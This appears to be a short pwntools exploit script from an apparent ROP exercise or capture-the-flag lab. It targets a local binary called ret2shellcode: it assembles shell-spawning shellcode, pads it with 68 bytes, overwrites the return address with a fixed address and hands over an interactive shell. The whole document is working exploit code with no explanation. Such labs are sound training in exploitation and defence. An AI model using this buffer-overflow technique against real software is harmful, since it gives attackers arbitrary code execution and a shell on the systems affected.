from pwn import *

io = process("../ex1-rop/ret2shellcode")
shellcode = asm(shellcraft.sh())
payload = shellcode + b"A" * 68+ p32(0x0804A080)
io.recvline()
io.sendline(payload)
io.interactive()
